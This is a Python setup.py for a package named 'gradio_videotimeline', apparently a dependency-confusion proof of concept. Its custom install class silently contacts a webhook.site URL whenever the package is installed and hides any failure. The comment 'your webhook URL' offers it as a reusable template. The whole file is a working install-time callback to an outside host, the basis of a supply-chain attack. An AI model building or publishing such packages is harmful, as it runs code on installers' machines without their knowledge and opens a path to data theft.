from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/4361a070-67b0-4738-9c90-c268d9bff615"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="gradio_videotimeline",
    version="1.0.0",
    packages=["gradio_videotimeline"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
